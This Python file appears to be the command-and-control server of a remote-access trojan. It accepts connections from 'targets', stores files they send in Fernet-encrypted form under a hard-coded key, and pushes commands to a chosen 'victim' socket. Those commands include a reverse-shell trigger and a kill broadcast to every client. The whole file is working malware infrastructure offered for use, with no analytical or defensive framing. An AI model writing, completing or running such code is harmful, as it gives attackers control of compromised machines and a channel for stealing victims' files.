import socket
from cryptography.fernet import Fernet
import os
import threading
import sys
import psutil
import time
tab_socket = []

def handle_client(conn, cipher_suite):
    try:
        tabData = []
        while True:
            print("Waiting for data...")
            data = conn.recv(5000)
            if not data:
                break
            decrypted_data = cipher_suite.decrypt(data).decode("utf-8")
            print(decrypted_data)
            tabData.append(decrypted_data)
            if len(tabData) == 2:
                filename = tabData[0]
                with open("./files/" + filename, 'a+') as file:
                    file.write(tabData[1])
                tabData = []
                conn.close()
                break
    except Exception as e:
        print(f"Error: {e}")


def socket_alive(tab_socket):
    for conn in tab_socket:
        try:
            conn['conn'].getpeername()
        except Exception as e:
            tab_socket.remove(conn)
    return bool(tab_socket)

def clean():
    psutil.Process(get_pid()).terminate()
    
def get_pid():
    with open('serverpid.txt','r') as file:
        pid = file.read()
    return int(pid)

def write_pid():
    with open('serverpid.txt','w') as file:
        file.write(str(os.getpid()))

def verify_kill():
        while True:
            try:
                if os.path.exists('kill.txt') and socket_alive(tab_socket):
                    send_kill_message(tab_socket)
                    time.sleep(2)
                    clean()
                if os.path.exists('kill.txt') and socket_alive(tab_socket) == False:
                    clean()
            except KeyboardInterrupt:
                clean()         
            

def verify_command():
    while True:
        try:
            if os.path.exists('command.txt'):
                with open('command.txt', 'r') as file:
                    content = file.read()
                    content = content.split('.')
                    if len(content) == 2:
                        launch_command(content[0], content[1])
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)
        
def server_conn(server_address, server_port):
    id=0
    write_pid()
    key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
    cipher_suite = Fernet(key)
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_address, server_port))
    server_socket.listen(5)
    print("Server is listening...")

    while True:
        dict_socket = {}
        conn, address_client = server_socket.accept()
        dict_socket['conn'] = conn
        dict_socket['address_client'] = address_client
        with open('socket.txt', 'a+') as file:
            file.write(f"{id}. connection: {dict_socket['address_client']}\n")
        id += 1
        tab_socket.append(dict_socket)
        print("Waiting for data...")
        print(f"New connection from {address_client}")
        server_thread = threading.Thread(target=handle_client, args=(conn, cipher_suite))
        verify_command_thread = threading.Thread(target=verify_command)
        verify_kill_thread = threading.Thread(target=verify_kill)

        server_thread.start()
        verify_command_thread.start()
        verify_kill_thread.start()

        

    
def launch_command(socket, shell):
    os.remove('command.txt')
    key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
    socket = tab_socket[int(socket)]['conn']
    encrypted_message = Fernet(key).encrypt(shell.encode('utf-8'))   
    socket.send(encrypted_message)


def send_kill_message(tab_socket):
    if not tab_socket:
        print("No active connections to send kill message to.")
        return
    
    key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
    message = "kill"
    print("Sending kill message to all clients...")
    for socket in tab_socket:
        encrypted_message = Fernet(key).encrypt(message.encode('utf-8'))
        socket['conn'].send(encrypted_message)
    
    tab_socket.clear()


def list_target():
    print("Targets:")
    with open('socket.txt', 'r') as file:
        print(file.read())  

def readfile(option):
    filename = option
    try:
        with open("./files/"+filename, 'r') as file:
            print(file.read())
    except FileNotFoundError:
        print(f"File {filename} does not exist on the server.")


def reverse_shell(victim):
    with open('command.txt', 'w+') as file:
        file.write(f'{str(victim)}.shell')

def listen(option):
    port = option
    server_conn("192.168.1.13", port)

def show():
    files = os.listdir("./files/")
    print("Files on the server:")
    for file in files:
        print(file)


def kill_all_servers():
    state_socket = socket_alive(tab_socket)
    if state_socket:
        with open('kill.txt', 'w+') as file:
            file.write("kill")
    else:
        clean()
   
        
